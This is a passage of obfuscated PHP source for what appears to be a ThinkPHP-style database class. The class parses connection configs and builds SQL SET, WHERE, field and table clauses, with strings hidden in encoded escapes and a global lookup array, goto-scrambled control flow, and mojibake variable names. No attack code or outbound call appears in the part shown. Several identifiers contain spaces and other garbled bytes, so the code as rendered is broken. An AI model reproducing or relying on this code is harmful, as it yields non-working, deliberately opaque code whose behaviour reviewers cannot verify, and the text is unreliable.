$a©¾ğçÁ¼; } } class Db { protected $dbType = null; protected $autoFree = false; protected $model = "\137\164\150\x69\x6e\153\x5f"; protected $pconnect = false; protected $queryStr = ''; protected $modelSql = array(); protected $lastInsID = null; protected $numRows = 0; protected $numCols = 0; protected $transTimes = 0; protected $error = ''; protected $linkID = array(); protected $_linkID = null; protected $queryID = null; protected $connected = false; protected $config = ''; protected $configLast = ''; protected $exp = array("\145\161" => "\75", "\156\x65\161" => "\74\x3e", "\147\164" => "\76", "\x65\x67\x74" => "\76\75", "\154\x74" => "\x3c", "\145\154\x74" => "\x3c\75", "\156\157\x74\x6c\151\153\x65" => "\116\117\x54\40\114\111\x4b\105", "\x6c\151\x6b\x65" => "\x4c\111\113\105", "\151\156" => "\x49\116", "\156\x6f\x74\x69\x6e" => "\x4e\x4f\124\40\111\116", "\x6e\157\x74\40\151\x6e" => "\x4e\117\x54\40\111\116", "\x62\145\x74\x77\145\145\x6e" => "\x42\x45\x54\x57\105\105\x4e", "\156\x6f\164\x62\145\x74\x77\x65\145\x6e" => "\x4e\x4f\x54\x20\x42\x45\x54\127\105\x45\116", "\x6e\157\164\40\142\145\164\x77\x65\x65\156" => "\x4e\x4f\124\x20\102\x45\124\127\105\105\116"); protected $selectSql = "\123\105\x4c\x45\x43\124\45\104\x49\123\124\111\116\x43\x54\x25\x20\x25\106\111\x45\114\x44\x25\40\x46\x52\117\115\40\x25\x54\x41\x42\114\105\45\x25\112\x4f\x49\116\x25\x25\127\110\105\x52\105\45\x25\107\x52\117\125\120\x25\45\x48\101\x56\x49\x4e\x47\45\x25\x4f\x52\x44\105\x52\x25\45\x4c\111\x4d\x49\124\45\x20\45\x55\x4e\111\x4f\x4e\x25\x25\103\x4f\x4d\115\x45\116\x54\45"; protected $bind = array(); public static function getInstance() { $BªøÏêÖ = func_get_args(); return think_get_instance_of(__CLASS__, $_SERVER[›é¼±][954], $BªøÏêÖ); } public function factory($a¡‡„Ñ¹ò• = '') { goto Cù©”Ûš ; BƒË©ÇÊ²‚: return $a¦«òµ¨½ß; goto B²çöÂŒ²Û; a‘Â‹ÛÓ¥Š: $this->dbType = ucwords(strtolower($a¡‡„Ñ¹ò•[$CóÛå•ãßç[955]])); $d¹ÍÊÜ®‡é = $CóÛå•ãßç[957] . $this->dbType; if (class_exists($d¹ÍÊÜ®‡é)) { $a¦«òµ¨½ß = new $d¹ÍÊÜ®‡é($a¡‡„Ñ¹ò•); if ($CóÛå•ãßç[792] != strtolower($a¡‡„Ñ¹ò•[$CóÛå•ãßç[955]])) { $a¦«òµ¨½ß->dbType = strtoupper($this->dbType); } else { $a¦«òµ¨½ß->dbType = $this->_getDsnType($a¡‡„Ñ¹ò•[$CóÛå•ãßç[910]]); } } else { think_exception(think_lang($CóÛå•ãßç[958]) . $CóÛå•ãßç[959] . $d¹ÍÊÜ®‡é); } goto BƒË©ÇÊ²‚; Cù©”Ûš : $CóÛå•ãßç =& $_SERVER[›é¼±]; $a¡‡„Ñ¹ò• = $this->parseConfig($a¡‡„Ñ¹ò•); if (empty($a¡‡„Ñ¹ò•[$CóÛå•ãßç[955]])) { think_exception(think_lang($CóÛå•ãßç[956])); } goto a‘Â‹ÛÓ¥Š; B²çöÂŒ²Û: } public function __call($Aù¥Â§à‚, $bòœÚ‘ñ¢’) { if (method_exists($this, $Aù¥Â§à‚)) { return call_user_func_array(array($this, $Aù¥Â§à‚), $bòœÚ‘ñ¢’); } } protected function _getDsnType($B®š¶œªßâ) { $bİÙÜ˜Ù = explode($_SERVER[›é¼±][4], $B®š¶œªßâ); $e„• ¾‚®Æ = strtoupper(trim($bİÙÜ˜Ù[0])); return $e„• ¾‚®Æ; } private function parseConfig($dÖ«† Áó¦ = '') { $aßˆâ¡Ì÷µ =& $_SERVER[›é¼±]; if (!empty($dÖ«† Áó¦) && is_string($dÖ«† Áó¦)) { $dÖ«† Áó¦ = $this->parseDSN($dÖ«† Áó¦); } elseif (is_array($dÖ«† Áó¦)) { $dÖ«† Áó¦ = array_change_key_case($dÖ«† Áó¦); $dÖ«† Áó¦ = array($aßˆâ¡Ì÷µ[955] => $dÖ«† Áó¦[$aßˆâ¡Ì÷µ[791]], $aßˆâ¡Ì÷µ[883] => $dÖ«† Áó¦[$aßˆâ¡Ì÷µ[960]], $aßˆâ¡Ì÷µ[884] => $dÖ«† Áó¦[$aßˆâ¡Ì÷µ[961]], $aßˆâ¡Ì÷µ[881] => $dÖ«† Áó¦[$aßˆâ¡Ì÷µ[962]], $aßˆâ¡Ì÷µ[882] => $dÖ«† Áó¦[$aßˆâ¡Ì÷µ[963]], $aßˆâ¡Ì÷µ[17] => $dÖ«† Áó¦[$aßˆâ¡Ì÷µ[964]], $aßˆâ¡Ì÷µ[910] => $dÖ«† Áó¦[$aßˆâ¡Ì÷µ[793]], $aßˆâ¡Ì÷µ[13] => isset($dÖ«† Áó¦[$aßˆâ¡Ì÷µ[965]]) ? $dÖ«† Áó¦[$aßˆâ¡Ì÷µ[965]] : array()); } elseif (empty($dÖ«† Áó¦)) { if (think_config($aßˆâ¡Ì÷µ[966]) && $aßˆâ¡Ì÷µ[792] != strtolower(think_config($aßˆâ¡Ì÷µ[967]))) { $dÖ«† Áó¦ = $this->parseDSN(think_config($aßˆâ¡Ì÷µ[966])); } else { $dÖ«† Áó¦ = array($aßˆâ¡Ì÷µ[955] => think_config($aßˆâ¡Ì÷µ[967]), $aßˆâ¡Ì÷µ[883] => think_config($aßˆâ¡Ì÷µ[968]), $aßˆâ¡Ì÷µ[884] => think_config($aßˆâ¡Ì÷µ[969]), $aßˆâ¡Ì÷µ[881] => think_config($aßˆâ¡Ì÷µ[970]), $aßˆâ¡Ì÷µ[882] => think_config($aßˆâ¡Ì÷µ[971]), $aßˆâ¡Ì÷µ[17] => think_config($aßˆâ¡Ì÷µ[244]), $aßˆâ¡Ì÷µ[910] => think_config($aßˆâ¡Ì÷µ[966]), $aßˆâ¡Ì÷µ[13] => think_config($aßˆâ¡Ì÷µ[972])); } } return $dÖ«† Áó¦; } protected function initConnect($FÌëŸ–ÈˆÓ = true) { if (1 == think_config($_SERVER[›é¼±][18])) { $this->_linkID = $this->multiConnect($FÌëŸ–ÈˆÓ); } else { if ($this->config) { $this->configLast = $this->config; } } if (!$this->connected) { $this->_linkID = $this->connect(); } } protected function closeConnect() { if (!$this->connected) { return; } foreach ($this->linkID as $B×î¬ÛŒ => $E‘Ïñ¬›´) { $this->_linkID = $E‘Ïñ¬›´; $this->close(); } $this->linkID = array(); $this->_linkID = null; $this->connected = !1; if (!$this->config && $this->configLast) { $this->config = $this->configLast; } } protected function multiConnect($còéí‰¼îÖ = false) { goto c ŠÍ¯›×ò; c ŠÍ¯›×ò: $côš‰ò™‹Â =& $_SERVER[›é¼±]; static $Dßİæ·ê†ä = array(); static $c»¤³Ú¶ÄÑ = -1; goto D««©¾¼’; EõßŠŸ˜™: $DÁã¦¤ğ¿ = array($côš‰ò™‹Â[883] => isset($Dßİæ·ê†ä[$côš‰ò™‹Â[883]][$eÔéáÍÊ¶]) ? $Dßİæ·ê†ä[$côš‰ò™‹Â[883]][$eÔéáÍÊ¶] : $Dßİæ·ê†ä[$côš‰ò™‹Â[883]][0], $côš‰ò™‹Â[884] => isset($Dßİæ·ê†ä[$côš‰ò™‹Â[884]][$eÔéáÍÊ¶]) ? $Dßİæ·ê†ä[$côš‰ò™‹Â[884]][$eÔéáÍÊ¶] : $Dßİæ·ê†ä[$côš‰ò™‹Â[884]][0], $côš‰ò™‹Â[881] => isset($Dßİæ·ê†ä[$côš‰ò™‹Â[881]][$eÔéáÍÊ¶]) ? $Dßİæ·ê†ä[$côš‰ò™‹Â[881]][$eÔéáÍÊ¶] : $Dßİæ·ê†ä[$côš‰ò™‹Â[881]][0], $côš‰ò™‹Â[882] => isset($Dßİæ·ê†ä[$côš‰ò™‹Â[882]][$eÔéáÍÊ¶]) ? $Dßİæ·ê†ä[$côš‰ò™‹Â[882]][$eÔéáÍÊ¶] : $Dßİæ·ê†ä[$côš‰ò™‹Â[882]][0], $côš‰ò™‹Â[17] => isset($Dßİæ·ê†ä[$côš‰ò™‹Â[17]][$eÔéáÍÊ¶]) ? $Dßİæ·ê†ä[$côš‰ò™‹Â[17]][$eÔéáÍÊ¶] : $Dßİæ·ê†ä[$côš‰ò™‹Â[17]][0], $côš‰ò™‹Â[910] => isset($Dßİæ·ê†ä[$côš‰ò™‹Â[910]][$eÔéáÍÊ¶]) ? $Dßİæ·ê†ä[$côš‰ò™‹Â[910]][$eÔéáÍÊ¶] : $Dßİæ·ê†ä[$côš‰ò™‹Â[910]][0], $côš‰ò™‹Â[13] => isset($Dßİæ·ê†ä[$côš‰ò™‹Â[13]][$eÔéáÍÊ¶]) ? $Dßİæ·ê†ä[$côš‰ò™‹Â[13]][$eÔéáÍÊ¶] : $Dßİæ·ê†ä[$côš‰ò™‹Â[13]][0]); return $this->connect($DÁã¦¤ğ¿, $eÔéáÍÊ¶); goto Añ©²ß¾Ã¢; D««©¾¼’: if (empty($Dßİæ·ê†ä)) { foreach ($this->config as $DÉ¿Ú‡°ì => $cŞÌÔ‹ÙŠ) { $Dßİæ·ê†ä[$DÉ¿Ú‡°ì] = explode($côš‰ò™‹Â[47], $cŞÌÔ‹ÙŠ); } } if (think_config($côš‰ò™‹Â[973])) { if ($còéí‰¼îÖ || think_config($côš‰ò™‹Â[391]) === !0) { $eÔéáÍÊ¶ = floor(mt_rand(0, think_config($côš‰ò™‹Â[974]) - 1)); $c»¤³Ú¶ÄÑ = $eÔéáÍÊ¶; } else { if (is_numeric(think_config($côš‰ò™‹Â[975]))) { $eÔéáÍÊ¶ = think_config($côš‰ò™‹Â[975]); } else { $eÔéáÍÊ¶ = floor(mt_rand(think_config($côš‰ò™‹Â[974]), count($Dßİæ·ê†ä[$côš‰ò™‹Â[881]]) - 1)); } } } else { $eÔéáÍÊ¶ = floor(mt_rand(0, count($Dßİæ·ê†ä[$côš‰ò™‹Â[881]]) - 1)); $c»¤³Ú¶ÄÑ = $eÔéáÍÊ¶; } $eÔéáÍÊ¶ = $c»¤³Ú¶ÄÑ !== -1 ? $c»¤³Ú¶ÄÑ : $eÔéáÍÊ¶; goto EõßŠŸ˜™; Añ©²ß¾Ã¢: } public function parseDSN($EôÍŒ‰Øï) { $eäÉš„ÜƒÉ =& $_SERVER[›é¼±]; if (empty($EôÍŒ‰Øï)) { return !1; } $AÈÀ«òíÀô = parse_url($EôÍŒ‰Øï); if ($AÈÀ«òíÀô[$eäÉš„ÜƒÉ[174]]) { $bª‹ÍÖ—… = array($eäÉš„ÜƒÉ[955] => $AÈÀ«òíÀô[$eäÉš„ÜƒÉ[174]], $eäÉš„ÜƒÉ[883] => isset($AÈÀ«òíÀô[$eäÉš„ÜƒÉ[588]]) ? $AÈÀ«òíÀô[$eäÉš„ÜƒÉ[588]] : $eäÉš„ÜƒÉ[33], $eäÉš„ÜƒÉ[884] => isset($AÈÀ«òíÀô[$eäÉš„ÜƒÉ[976]]) ? $AÈÀ«òíÀô[$eäÉš„ÜƒÉ[976]] : $eäÉš„ÜƒÉ[33], $eäÉš„ÜƒÉ[881] => isset($AÈÀ«òíÀô[$eäÉš„ÜƒÉ[175]]) ? $AÈÀ«òíÀô[$eäÉš„ÜƒÉ[175]] : $eäÉš„ÜƒÉ[33], $eäÉš„ÜƒÉ[882] => isset($AÈÀ«òíÀô[$eäÉš„ÜƒÉ[176]]) ? $AÈÀ«òíÀô[$eäÉš„ÜƒÉ[176]] : $eäÉš„ÜƒÉ[33], $eäÉš„ÜƒÉ[17] => isset($AÈÀ«òíÀô[$eäÉš„ÜƒÉ[76]]) ? substr($AÈÀ«òíÀô[$eäÉš„ÜƒÉ[76]], 1) : $eäÉš„ÜƒÉ[33]); } else { preg_match($eäÉš„ÜƒÉ[977], trim($EôÍŒ‰Øï), $AÉ®çĞªÍ); $bª‹ÍÖ—… = array($eäÉš„ÜƒÉ[955] => $AÉ®çĞªÍ[1], $eäÉš„ÜƒÉ[883] => $AÉ®çĞªÍ[2], $eäÉš„ÜƒÉ[884] => $AÉ®çĞªÍ[3], $eäÉš„ÜƒÉ[881] => $AÉ®çĞªÍ[4], $eäÉš„ÜƒÉ[882] => $AÉ®çĞªÍ[5], $eäÉš„ÜƒÉ[17] => $AÉ®çĞªÍ[6]); } $bª‹ÍÖ—…[$eäÉš„ÜƒÉ[910]] = $eäÉš„ÜƒÉ[33]; return $bª‹ÍÖ—…; } protected function debug() { $e¬—Œƒ =& $_SERVER[›é¼±]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $e¬—Œƒ[978]; if (think_config($e¬—Œƒ[979])) { think_status($e¬—Œƒ[980]); think_trace($this->queryStr . $e¬—Œƒ[981] . think_status($e¬—Œƒ[20], $e¬—Œƒ[980], 6) . $e¬—Œƒ[982], $e¬—Œƒ[33], $e¬—Œƒ[983]); } } protected function parseLock($aŠº™›˜ô­ = false) { $Dó§Úƒ¯¥ =& $_SERVER[›é¼±]; if (!$aŠº™›˜ô­) { return $Dó§Úƒ¯¥[33]; } if ($Dó§Úƒ¯¥[912] == $this->dbType) { return $Dó§Úƒ¯¥[984]; } return $Dó§Úƒ¯¥[985]; } protected function parseSet($eÈä¯Ş´®‰) { $BÃÑå÷¤ˆç =& $_SERVER[›é¼±]; foreach ($eÈä¯Ş´®‰ as $BĞæğ»Ÿ•± => $fÏ¦¶Ä¶³Ş) { if (is_array($fÏ¦¶Ä¶³Ş) && $BÃÑå÷¤ˆç[295] == $fÏ¦¶Ä¶³Ş[0]) { $eÁ†‰„Œ­©[] = $this->parseKey($BĞæğ»Ÿ•±) . $BÃÑå÷¤ˆç[986] . $fÏ¦¶Ä¶³Ş[1]; } elseif (is_scalar($fÏ¦¶Ä¶³Ş) || is_null($fÏ¦¶Ä¶³Ş)) { $eÁ†‰„Œ­©[] = $this->parseKey($BĞæğ»Ÿ•±) . $BÃÑå÷¤ˆç[986] . $this->parseValue($fÏ¦¶Ä¶³Ş); } } return $BÃÑå÷¤ˆç[987] . implode($BÃÑå÷¤ˆç[47], $eÁ†‰„Œ­©); } protected function bindParam($aôÙÀõ¿–à, $D„‚¼í»õ) { $this->bind[$_SERVER[›é¼±][4] . $aôÙÀõ¿–à] = $D„‚¼í»õ; } protected function parseBind($B˜—Ô·ßøØ) { $B˜—Ô·ßøØ = array_merge($this->bind, $B˜—Ô·ßøØ); $this->bind = array(); return $B˜—Ô·ßøØ; } function parseKey(&$fß¿š–¦İ‡, $c¥Î²” = true) { if ($c¥Î²”) { $fß¿š–¦İ‡ = $this->parseKeyCheck($fß¿š–¦İ‡); } return $fß¿š–¦İ‡; } function parseKeyCheck($Bù“Øà‰×Œ) { $a™Â˜Ññ© =& $_SERVER[›é¼±]; $Bù“Øà‰×Œ = trim($Bù“Øà‰×Œ); if (!preg_match($a™Â˜Ññ©[988], $Bù“Øà‰×Œ)) { think_exception($a™Â˜Ññ©[989] . $Bù“Øà‰×Œ); } return $Bù“Øà‰×Œ; } protected function parseValue($dŒœà…Ÿ”Ï) { $aÑ´èô­Ş• =& $_SERVER[›é¼±]; if (is_string($dŒœà…Ÿ”Ï)) { $dŒœà…Ÿ”Ï = $aÑ´èô­Ş•[951] . $this->escapeString($dŒœà…Ÿ”Ï) . $aÑ´èô­Ş•[951]; } elseif (isset($dŒœà…Ÿ”Ï[0]) && is_string($dŒœà…Ÿ”Ï[0]) && strtolower($dŒœà…Ÿ”Ï[0]) == $aÑ´èô­Ş•[295]) { $dŒœà…Ÿ”Ï = $this->escapeString($dŒœà…Ÿ”Ï[1]); } elseif (is_array($dŒœà…Ÿ”Ï)) { $dŒœà…Ÿ”Ï = array_map(array($this, $aÑ´èô­Ş•[952]), $dŒœà…Ÿ”Ï); } elseif (is_bool($dŒœà…Ÿ”Ï)) { $dŒœà…Ÿ”Ï = $dŒœà…Ÿ”Ï ? $aÑ´èô­Ş•[87] : $aÑ´èô­Ş•[191]; } elseif (is_null($dŒœà…Ÿ”Ï)) { $dŒœà…Ÿ”Ï = $aÑ´èô­Ş•[103]; } return $dŒœà…Ÿ”Ï; } protected function parseField($CÎ³Œø—Ã¦) { $Cé…Ê…å„ =& $_SERVER[›é¼±]; if (is_string($CÎ³Œø—Ã¦) && strpos($CÎ³Œø—Ã¦, $Cé…Ê…å„[47])) { $CÎ³Œø—Ã¦ = explode($Cé…Ê…å„[47], $CÎ³Œø—Ã¦); } if (is_array($CÎ³Œø—Ã¦)) { $cÂ¿õ«†í = array(); foreach ($CÎ³Œø—Ã¦ as $CƒïÒ’ĞŸî => $D¸·×…) { if (!is_numeric($CƒïÒ’ĞŸî)) { $cÂ¿õ«†í[] = $this->parseKey($CƒïÒ’ĞŸî, !1) . $Cé…Ê…å„[990] . $this->parseKey($D¸·×…); } else { $cÂ¿õ«†í[] = $this->parseKey($D¸·×…); } } $a§Õ»ô°±“ = implode($Cé…Ê…å„[47], $cÂ¿õ«†í); } elseif (is_string($CÎ³Œø—Ã¦) && !empty($CÎ³Œø—Ã¦)) { $a§Õ»ô°±“ = $CÎ³Œø—Ã¦; } else { $a§Õ»ô°±“ = $Cé…Ê…å„[182]; } return $a§Õ»ô°±“; } protected function parseTable($FŒ²õ†Úœ†) { $d†³»¦æè¦ =& $_SERVER[›é¼±]; if (is_array($FŒ²õ†Úœ†)) { $E‰¶‘Ö©Ú = array(); foreach ($FŒ²õ†Úœ† as $dÊÛÙÖËëó => $açÏ¬©îæ›) { if (!is_numeric($dÊÛÙÖËëó)) { $E‰¶‘Ö©Ú[] = $this->parseKey($dÊÛÙÖËëó) . $d†³»¦æè¦[50] . $this->parseKey($açÏ¬©îæ›); } else { $E‰¶‘Ö©Ú[] = $this->parseKey($dÊÛÙÖËëó); } } $FŒ²õ†Úœ† = $E‰¶‘Ö©Ú; } elseif (is_string($FŒ²õ†Úœ†)) { if (strstr($FŒ²õ†Úœ†, $d†³»¦æè¦[50])) { return $FŒ²õ†Úœ†; } $FŒ²õ†Úœ† = explode($d†³»¦æè¦[47], $FŒ²õ†Úœ†); array_walk($FŒ²õ†Úœ†, array($this, $d†³»¦æè¦[901])); } return $d†³»¦æè¦[895] . trim(implode($d†³»¦æè¦[991], $FŒ²õ†Úœ†), $d†³»¦æè¦[383]) . $d†³»¦æè¦[895]; } protected function parseWhere($a˜›ÜŸ£Â·) { $BÈÙà¦ÒŠ¤ =& $_SERVER[›é¼±]; $aí­É‰Úµ = $BÈÙà¦ÒŠ¤[33]; if (is_string($a˜›ÜŸ£Â·)) { $aí­É‰Úµ = $a˜›ÜŸ£Â·; } else { $E‰²ÙˆéÆí = isset($a˜›ÜŸ£Â·[$BÈÙà¦ÒŠ¤[992]]) ? strtoupper($a˜›ÜŸ£Â·[$BÈÙà¦ÒŠ¤[992]]) : $BÈÙà¦ÒŠ¤[33]; if (in_array($E‰²ÙˆéÆí, array($BÈÙà¦ÒŠ¤[993], $BÈÙà¦ÒŠ¤[994], $BÈÙà¦ÒŠ¤[995]))) { $E‰²ÙˆéÆí = $BÈÙà¦ÒŠ¤[50] . $E‰²ÙˆéÆí . $BÈÙà¦ÒŠ¤[50]; unset($a˜›ÜŸ£Â·[$BÈÙà¦ÒŠ¤[992]]); } else { $E‰²ÙˆéÆí = $BÈÙà¦ÒŠ¤[996]; } foreach ($a˜›ÜŸ£Â· as $Cé½Ä‚ˆ¥– => $DïîŠÕ™æØ) { $aí­É‰Úµ .= $BÈÙà¦ÒŠ¤[275]; if (is_numeric($Cé½Ä‚ˆ¥–)) { $Cé½Ä‚ˆ¥– = $BÈÙà¦ÒŠ¤[997]; } if (0 === strpos($Cé½Ä‚ˆ¥–, $BÈÙà¦ÒŠ¤[71])) { $aí­É‰Úµ .= $this->parseThinkWhere($Cé½Ä‚ˆ¥–, $DïîŠÕ™æØ); } else { if (!preg_match($BÈÙà¦ÒŠ¤[998], trim($Cé½Ä‚ˆ¥–))) { think_exception(think_lang($BÈÙà¦ÒŠ¤[999]) . $BÈÙà¦ÒŠ¤[4] . $Cé½Ä‚ˆ¥–); } $dÈ‚šƒß‹Ò = is_array($DïîŠÕ™æØ) && isset($DïîŠÕ™æØ[$BÈÙà¦ÒŠ¤[1000]]); $Cé½Ä‚ˆ¥– = trim($Cé½Ä‚ˆ¥–); if (strpos($Cé½Ä‚ˆ¥–, $BÈÙà¦ÒŠ¤[281])) { $Dà½Óè¯İ¯ = explode($BÈÙà¦ÒŠ¤[281], $Cé½Ä‚ˆ¥–); $EÛÔŠæƒ¤Ï = array(); foreach ($Dà½Óè¯İ¯ as $cÊÂ‰§Ò¿ => $AµÔ†””é) { $a¼é•îêÍÊ = $dÈ‚šƒß‹Ò ? $DïîŠÕ™æØ[$cÊÂ‰§Ò¿] : $DïîŠÕ™æØ; $EÛÔŠæƒ¤Ï[] = $BÈÙà¦ÒŠ¤[258] . $this->parseWhereItem($this->parseKey($AµÔ†””é), $a¼é•îêÍÊ) . $BÈÙà¦ÒŠ¤[900]; } $aí­É‰Úµ .= implode($BÈÙà¦ÒŠ¤[1001], $EÛÔŠæƒ¤Ï); } elseif (strpos($Cé½Ä‚ˆ¥–, $BÈÙà¦ÒŠ¤[282])) { $Dà½Óè¯İ¯ = explode($BÈÙà¦ÒŠ¤[282], $Cé½Ä‚ˆ¥–); $EÛÔŠæƒ¤Ï = array(); foreach ($Dà½Óè¯İ¯ as $cÊÂ‰§Ò¿ => $AµÔ†””é) { $a¼é•îêÍÊ = $dÈ‚šƒß‹Ò ? $DïîŠÕ™æØ[$cÊÂ‰§Ò¿] : $DïîŠÕ™æØ; $EÛÔŠæƒ¤Ï[] = $BÈÙà¦ÒŠ¤[258] . $this->parseWhereItem($this->parseKey($AµÔ†””é), $a¼é•îêÍÊ) . $BÈÙà¦ÒŠ¤[900]; } $aí­É‰Úµ .= implode($BÈÙà¦ÒŠ¤[996], $EÛÔŠæƒ¤Ï); } else { $aí­É‰Úµ .= $this->parseWhereItem($this->parseKey($Cé½Ä‚ˆ¥–), $DïîŠÕ™æØ); } } $aí­É‰Úµ .= $BÈÙà¦ÒŠ¤[276] . $E‰²ÙˆéÆí; } $aí­É‰Úµ = substr($aí­É‰Úµ, 0, -strlen($E‰²ÙˆéÆí)); } return empty($aí­É‰Úµ) ? $BÈÙà¦ÒŠ¤[33] : $BÈÙà¦ÒŠ¤[1002] . $aí­É‰Úµ; } protected function parseWhereItem($eì“Ì‡ÖÑš, $dØ†Ö­¹¤Ç) { $EÄ¨É¢ª°¸ =& $_SERVER[›é¼±]; $b„Ğ§”ğ¸… = $EÄ¨É¢ª°¸[33]; if (is_array($dØ†Ö­¹¤Ç)) { if (is_string($dØ†Ö­¹¤Ç[0])) { $FøíŞ’ƒ© = strtolower($dØ†Ö­¹¤Ç[0]); if (in_array($dØ†Ö­¹¤Ç[0], array($EÄ¨É¢ª°¸[986], $EÄ¨É¢ª°¸[1003], $EÄ¨É¢ª°¸[1004], $EÄ¨É¢ª°¸[1005], $EÄ¨É¢ª°¸[1006], $EÄ¨É¢ª°¸[1007]))) { $b„Ğ§”ğ¸… .= $eì“Ì‡ÖÑš . $EÄ¨É¢ª°¸[50] . $dØ†Ö­¹¤Ç[0] . $EÄ¨É¢ª°¸[50] . $this->parseValue($dØ†Ö­¹¤Ç[1]); } elseif (preg_match($EÄ¨É¢ª°¸[1008], $dØ†Ö­¹¤Ç[0])) { $b„Ğ§”ğ¸… .= $eì“Ì‡ÖÑš . $EÄ¨É¢ª°¸[50] . $this->exp[$FøíŞ’ƒ©] . $EÄ¨É¢ª°¸[50] . $this->parseValue($dØ†Ö­¹¤Ç[1]); } elseif (preg_match($EÄ¨É¢ª°¸[1009], $dØ†Ö­¹¤Ç[0])) { if (is_array($dØ†Ö­¹¤Ç[1])) { $aëß©Èˆœ« = isset($dØ†Ö­¹¤Ç[2]) ? strtoupper($dØ†Ö­¹¤Ç[2]) : $EÄ¨É¢ª°¸[994]; if (in_array($aëß©Èˆœ«, array($EÄ¨É¢ª°¸[993], $EÄ¨É¢ª°¸[994], $EÄ¨É¢ª°¸[995]))) { $fö–†É®¤’ = array(); foreach ($dØ†Ö­¹¤Ç[1] as $d–¦«‹Õ) { $fö–†É®¤’[] = $eì“Ì‡ÖÑš . $EÄ¨É¢ª°¸[50] . $this->exp[$FøíŞ’ƒ©] . $EÄ¨É¢ª°¸[50] . $this->parseValue($d–¦«‹Õ); } $b„Ğ§”ğ¸… .= $EÄ¨É¢ª°¸[258] . implode($EÄ¨É¢ª°¸[50] . $aëß©Èˆœ« . $EÄ¨É¢ª°¸[50], $fö–†É®¤’) . $EÄ¨É¢ª°¸[900]; } } else { $b„Ğ§”ğ¸… .= $eì“Ì‡ÖÑš . $EÄ¨É¢ª°¸[50] . $this->exp[$FøíŞ’ƒ©] . $EÄ¨É¢ª°¸[50] . $this->parseValue($dØ†Ö­¹¤Ç[1]); } } elseif ($EÄ¨É¢ª°¸[295] == $FøíŞ’ƒ©) { $b„Ğ§”ğ¸… .= $EÄ¨É¢ª°¸[898] . $eì“Ì‡ÖÑš . $EÄ¨É¢ª°¸[50] . $dØ†Ö­¹¤Ç[1] . $EÄ¨É¢ª°¸[1010]; } elseif (preg_match($EÄ¨É¢ª°¸[1011], $dØ†Ö­¹¤Ç[0])) { $b„Ğ§”ğ¸… .= $dØ†Ö­¹¤Ç[0]; } elseif (preg_match($EÄ¨É¢ª°¸[1012], $dØ†Ö­¹¤Ç[0])) { if (isset($dØ†Ö­¹¤Ç[2]) && $EÄ¨É¢ª°¸[295] == $dØ†Ö­¹¤Ç[2]) { $b„Ğ§”ğ¸… .= $eì“Ì‡ÖÑš . $EÄ¨É¢ª°¸[50] . $this->exp[$FøíŞ’ƒ©] . $EÄ¨É¢ª°¸[50] . $dØ†Ö­¹¤Ç[1]; } else { if (is_string($dØ†Ö­¹¤Ç[1])) { $dØ†Ö­¹¤Ç[1] = explode($EÄ¨É¢ª°¸[47], $dØ†Ö­¹¤Ç[1]); } $eÍÚ•Âô˜ = implode($EÄ¨É¢ª°¸[47], $this->parseValue($dØ†Ö­¹¤Ç[1])); $b„Ğ§”ğ¸… .= $eì“Ì‡ÖÑš . $EÄ¨É¢ª°¸[50] . $this->exp[$FøíŞ’ƒ©] . $EÄ¨É¢ª°¸[898] . $eÍÚ•Âô˜ . $EÄ¨É¢ª°¸[900]; } } elseif (preg_match($EÄ¨É¢ª°¸[1013], $dØ†Ö­¹¤Ç[0])) { $F—§µƒæ‰Ê = is_string($dØ†Ö­¹¤Ç[1]) ? explode($EÄ¨É¢ª°¸[47], $dØ†Ö­¹¤Ç[1]) : $dØ†Ö­¹¤Ç[1]; $b„Ğ§”ğ¸… .= $EÄ¨É¢ª°¸[898] . $eì“Ì‡ÖÑš . $EÄ¨É¢ª°¸[50] . $this->exp[$FøíŞ’ƒ©] . $EÄ¨É¢ª°¸[50] . $this->parseValue($F—§µƒæ‰Ê[0]) . $EÄ¨É¢ª°¸[996] . $this->parseValue($F—§µƒæ‰Ê[1]) . $EÄ¨É¢ª°¸[276]; } else { think_exception(think_lang($EÄ¨É¢ª°¸[999]) . $EÄ¨É¢ª°¸[4] . $dØ†Ö­¹¤Ç[0]); } } else { $F‰­Ç’»ã¤ = count($dØ†Ö­¹¤Ç); $E’£¶¬•Ï = $EÄ¨É¢ª°¸[33]; if (is_string($dØ†Ö­¹¤Ç[$F‰­Ç’»ã¤ - 1])) { $E’£¶¬•Ï = isset($dØ†Ö­¹¤Ç[$F‰­Ç’»ã¤ - 1]) ? strtoupper($dØ†Ö­¹¤Ç[$F‰­Ç’»ã¤ - 1]) : $EÄ¨É¢ª°¸[33]; if (in_array($E’£¶¬•Ï, array($EÄ¨É¢ª°¸[993], $EÄ¨É¢ª°¸[994], $EÄ¨É¢ª°¸[995]))) { $F‰­Ç’»ã¤ = $F‰­Ç’»ã¤ - 1; } } else { $E’£¶¬•Ï = $EÄ¨É¢ª°¸[993]; } for ($AÅáíËÔ÷¬ = 0; $AÅáíËÔ÷¬ < $F‰­Ç’»ã¤; $AÅáíËÔ÷¬++) { $F—§µƒæ‰Ê = is_array($dØ†Ö­¹¤Ç[$AÅáíËÔ÷¬]) ? $dØ†Ö­¹¤Ç[$AÅáíËÔ÷¬][1] : $dØ†Ö­¹¤Ç[$AÅáíËÔ÷¬]; if ($EÄ¨É¢ª°¸[295] == strtolower($dØ†Ö­¹¤Ç[$AÅáíËÔ÷¬][0])) { $b„Ğ§”ğ¸… .= $EÄ¨É¢ª°¸[258] . $eì“Ì‡ÖÑš . $EÄ¨É¢ª°¸[50] . $F—§µƒæ‰Ê . $EÄ¨É¢ª°¸[1010] . $E’£¶¬•Ï . $EÄ¨É¢ª°¸[50]; } else { $AÚ•ŒÙ¶Ç = is_array($dØ†Ö­¹¤Ç[$AÅáíËÔ÷¬]) ? $this->exp[strtolower($dØ†Ö­¹¤Ç[$AÅáíËÔ÷¬][0])] : $EÄ¨É¢ª°¸[986]; if (!$AÚ•ŒÙ¶Ç && is_array($dØ†Ö­¹¤Ç[$AÅáíËÔ÷¬]) && in_array($dØ†Ö­¹¤Ç[$AÅáíËÔ÷¬][0], array($EÄ¨É¢ª°¸[986], $EÄ¨É¢ª°¸[1003], $EÄ¨É¢ª°¸[1004], $EÄ¨É¢ª°¸[1005], $EÄ¨É¢ª°¸[1006], $EÄ¨É¢ª°¸[1007]))) { $AÚ•ŒÙ¶Ç = $dØ†Ö­¹¤Ç[$AÅáíËÔ÷¬][0]; } $b„Ğ§”ğ¸… .= $EÄ¨É¢ª°¸[258] . $eì“Ì‡ÖÑš . $EÄ¨É¢ª°¸[50] . $AÚ•ŒÙ¶Ç . $EÄ¨É¢ª°¸[50] . $this->parseValue($F—§µƒæ‰Ê) 